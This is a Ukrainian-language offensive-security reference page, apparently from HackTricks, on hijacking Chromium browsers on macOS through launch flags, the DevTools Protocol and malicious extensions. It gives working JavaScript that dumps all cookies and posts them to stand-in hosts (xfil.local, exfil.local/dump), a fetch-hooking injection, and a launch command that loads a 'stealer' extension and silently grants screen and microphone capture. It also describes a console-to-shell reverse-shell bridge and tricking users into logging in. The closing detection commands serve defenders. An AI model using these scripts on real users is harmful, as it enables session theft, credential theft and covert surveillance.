# Ін’єкція в Chromium на macOS

{{#include ../../../banners/hacktricks-training.md}}

## Основна інформація

Браузери на базі Chromium, такі як Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi та Opera, використовують однакові перемикачі командного рядка, файли налаштувань та інтерфейси автоматизації DevTools. У macOS будь-який користувач із доступом до GUI може завершити наявну сесію браузера та повторно відкрити його з довільними прапорцями, розширеннями або кінцевими точками DevTools, які працюватимуть із entitlement'ами цільового користувача.

#### Запуск Chromium із власними прапорцями в macOS

macOS підтримує лише один екземпляр UI для кожного профілю Chromium, тому для інструментування зазвичай потрібно примусово закрити браузер (наприклад, за допомогою `osascript -e 'tell application "Google Chrome" to quit'`). Attackers зазвичай повторно запускають його через `open -na "Google Chrome" --args <flags>`, щоб ін’єктувати аргументи без змінення app bundle. Обгортання цієї команди в користувацькому LaunchAgent (`~/Library/LaunchAgents/*.plist`) або login hook гарантує, що змінений браузер буде повторно запущено після перезавантаження чи виходу із системи.

#### Прапорець `--load-extension`

Прапорець `--load-extension` автоматично завантажує unpacked extensions (шляхи, розділені комами). Використовуйте його разом із `--disable-extensions-except`, щоб заблокувати легітимні розширення та примусово запускати лише ваш payload. Шкідливі розширення можуть запитувати дозволи з високим рівнем впливу, такі як `debugger`, `webRequest` і `cookies`, щоб отримати доступ до протоколів DevTools, змінювати CSP-заголовки, знижувати рівень HTTPS або exfiltrate матеріали сесії одразу після запуску браузера.<sup>[[4]](#references)</sup>

#### Прапорці `--remote-debugging-port` / `--remote-debugging-pipe`

Ці перемикачі відкривають Chrome DevTools Protocol (CDP) через TCP або pipe, щоб зовнішні інструменти могли керувати браузером. Google зафіксував масштабне зловживання цим інтерфейсом infostealer'ами, і починаючи з Chrome 136 (березень 2025 року) ці перемикачі ігноруються для профілю за замовчуванням, якщо браузер запущено без нестандартного `--user-data-dir`. Це забезпечує App-Bound Encryption у реальних профілях, але attackers усе ще можуть створити новий профіль, змусити жертву автентифікуватися в ньому (за допомогою phishing/triage assistance) і збирати cookies, tokens, стани довіри пристрою або реєстрації WebAuthn через CDP.<sup>[[5]](#references)</sup>

#### Прапорець `--user-data-dir`

Цей прапорець перенаправляє весь профіль браузера (History, Cookies, Login Data, файли Preference тощо) до шляху, контрольованого attacker'ом. Він обов’язковий під час поєднання сучасних збірок Chrome із `--remote-debugging-port`, а також ізолює змінений профіль, щоб можна було розмістити попередньо заповнені файли `Preferences` або `Secure Preferences`, які вимикають security prompts, автоматично встановлюють розширення та змінюють default schemes.

#### Прапорець `--use-fake-ui-for-media-stream`

Цей перемикач обходить запит дозволу на використання камери/мікрофона, тому будь-яка сторінка, яка викликає `getUserMedia`, негайно отримує доступ. Поєднуйте його з такими прапорцями, як `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` або командами CDP `Browser.grantPermissions`, щоб приховано захоплювати аудіо/відео, ділитися екраном або проходити перевірки дозволів WebRTC без взаємодії з користувачем.<sup>[[4]](#references)</sup>

## Поширені в реальних атаках способи доставки та повторного запуску

Зловживання CDP зазвичай є етапом **post-exploitation**, а не початковим payload. Нещодавня кампанія macOS, спрямована на developers, використовувала отруєну фазу збірки Xcode **`Run Script`** (`PBXShellScriptBuildPhase`), тому code виконувався лише тоді, коли жертва **збирала** проєкт, а не просто клонувала чи відкривала його. Після першого виконання malware також заражав інші дерева `.xcodeproj`, додавав шкідливі Git hooks `pre-commit` і шукав додаткові Xcode-проєкти в ZIP-архівах.<sup>[[3]](#references)</sup>

Для зловживання Chromium це важливо, оскільки attacker'у не потрібно змінювати сам browser binary. Натомість короткоживучий build-phase / `osascript` stager може встановити **browser wrapper** (LaunchAgent, login item, запис у Dock, trojanized app launcher тощо), який щоразу повторно відкриватиме легітимний браузер із прапорцями, контрольованими attacker'ом, коли користувач його запускає.<sup>[[3]](#references)</sup>

> [!TIP]
> На developer endpoints перевіряйте файли `.pbxproj`, `.git/hooks/pre-commit` і ZIP-файли, що містять `.xcodeproj`, на наявність несподіваних `curl`, `osascript`, `xxd`, вкладеного `base64` або логіки повторного запуску Chrome.

## Зловживання Remote Debugging і DevTools Protocol

Після повторного запуску Chrome зі спеціальними `--user-data-dir` і `--remote-debugging-port` до нього можна під’єднатися через CDP (наприклад, за допомогою `chrome-remote-interface`, `puppeteer` або `playwright`) і автоматизувати workflow з високими привілеями:

- **Крадіжка cookies/сесії:** `Network.getAllCookies` і `Storage.getCookies` повертають значення HttpOnly навіть тоді, коли App-Bound encryption зазвичай блокувала б доступ до файлової системи, оскільки CDP просить запущений браузер розшифрувати їх.
- **Зміна дозволів:** `Browser.grantPermissions` і `Emulation.setGeolocationOverride` дають змогу обходити запити дозволу на камеру/мікрофон (особливо в поєднанні з `--use-fake-ui-for-media-stream`) або підробляти security checks, що залежать від місцезнаходження.
- **Ін’єкція keystrokes/script:** `Runtime.evaluate` виконує довільний JavaScript в активній вкладці, що дає змогу викрадати credentials, змінювати DOM або ін’єктувати persistence beacons, які переживають навігацію.<sup>[[1]](#references)</sup>
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` і `Fetch.enable` перехоплюють автентифіковані запити/відповіді в реальному часі без доступу до артефактів на диску.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Оскільки Chrome 136 блокує CDP у профілі за замовчуванням, копіювання наявної в жертви директорії `~/Library/Application Support/Google/Chrome` до staging-шляху більше не дає змоги отримати розшифровані cookies. Натомість переконайте користувача автентифікуватися в інструментованому профілі (наприклад, під виглядом «корисного» сеансу підтримки) або перехоплюйте MFA-токени під час передавання через керовані CDP мережеві hooks.<sup>[[5]](#references)</sup>

### Ланцюжок CDP Backdoor у стилі XCSSET

Практичний шаблон malware:

1. Перезапускайте userland implant або wrapper щоразу під час запуску Chrome.
2. Запускайте легітимний браузер із `--remote-debugging-port=<port>` і, у Chrome 136+, зазвичай із парним непов’язаним із типовим профілем `--user-data-dir=<dir>`.
3. Запускайте helper, який під’єднується до локального CDP WebSocket і реєструє pre-document hook за допомогою `Page.addScriptToEvaluateOnNewDocument`.<sup>[[2]](#references)</sup>

Такий helper може інжектити JavaScript **до** виконання коду сайту, що ідеально підходить для hooking `window.fetch`, `XMLHttpRequest`, wallet providers або autofill flows без модифікації файлів на диску.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Ще потужніший варіант перетворює браузер на **міст до команд host**: ін'єктований JavaScript виводить `console.log` із маркером-роздільником, локальний helper відстежує `Runtime.consoleAPICalled`, видаляє маркер, виконує решту через shell host (наприклад, `exec.Command` у Go), а потім повертає stdout/stderr через WebSocket атакувальника. Це перетворює виконання скриптів на рівні вкладки на переважно безфайловий reverse shell.<sup>[[3]](#references)</sup>

## Ін'єкція через Extension за допомогою Debugger API

Дослідження 2023 року "Chrowned by an Extension" продемонструвало, що шкідливий extension, який використовує API `chrome.debugger`, може під'єднатися до будь-якої вкладки й отримати ті самі можливості DevTools, що й `--remote-debugging-port`.<sup>[[6]](#references)</sup> Це руйнує початкові припущення щодо ізоляції (extensions залишаються у власному контексті) та уможливлює:

- Тихе викрадення cookie і облікових даних за допомогою `Network.getAllCookies`/`Fetch.getResponseBody`.
- Зміну дозволів сайтів (камера, мікрофон, геолокація) і обхід interstitial-попереджень безпеки, що дає змогу phishing-сторінкам імітувати діалогові вікна Chrome.
- Маніпуляції «на шляху» з TLS-попередженнями, завантаженнями або запитами WebAuthn шляхом програмного керування через `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` або `Security.handleCertificateError`.

Завантажте extension за допомогою `--load-extension`/`--disable-extensions-except`, щоб не вимагати взаємодії користувача. Мінімальний background script, який weaponizes API, виглядає так:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Розширення також може підписуватися на події `Debugger.paused`, щоб зчитувати JavaScript-змінні, змінювати inline-скрипти або додавати власні точки зупину, які зберігаються після навігації. Оскільки все виконується всередині GUI-сесії користувача, Gatekeeper і TCC не активуються, що робить цю техніку ідеальною для malware, яке вже отримало виконання в контексті користувача.<sup>[[6]](#references)</sup>

## Виявлення та пошук

- Створюйте сповіщення про запуск Chromium-браузерів із параметрами `--remote-debugging-port`, `--remote-debugging-pipe` або підозрілим `--user-data-dir`, особливо якщо батьківським процесом є `bash`, `sh`, `osascript`, `xcodebuild` або допоміжний процес LaunchAgent.
- Шукайте короткі ланцюжки, у яких допоміжний процес відкриває локальний CDP WebSocket, реєструє `Page.addScriptToEvaluateOnNewDocument`, а потім встановлює довготривале вихідне WebSocket/HTTPS-з'єднання.
- Шукайте мости console-to-shell, зіставляючи активність браузера `Runtime.consoleAPICalled` із дочірніми shell або допоміжними процесами, що виконують команди, надані атакувальником.
- На Mac розробників перевіряйте записи `PBXShellScriptBuildPhase` у `.pbxproj`, Git hooks `pre-commit`, перезапускачі Dock/login item і Xcode-проєкти, що містяться в ZIP, на предмет встановлення browser wrapper.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Інструменти

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Автоматизує запуск Chromium із payload extensions і надає інтерактивні CDP hooks.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Схожий інструмент, орієнтований на перехоплення трафіку та browser instrumentation для операторів macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Бібліотека Node.js для написання сценаріїв, що працюють із дампами Chrome DevTools Protocol (cookies, DOM, permissions), коли активний екземпляр із `--remote-debugging-port`.

### Приклад
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Знайдіть більше прикладів у посиланнях на tools.

## Посилання

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: A Deep Dive Into the Latest XCSSET Version - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) on X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Abusing the Chrome DevTools Protocol through the Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
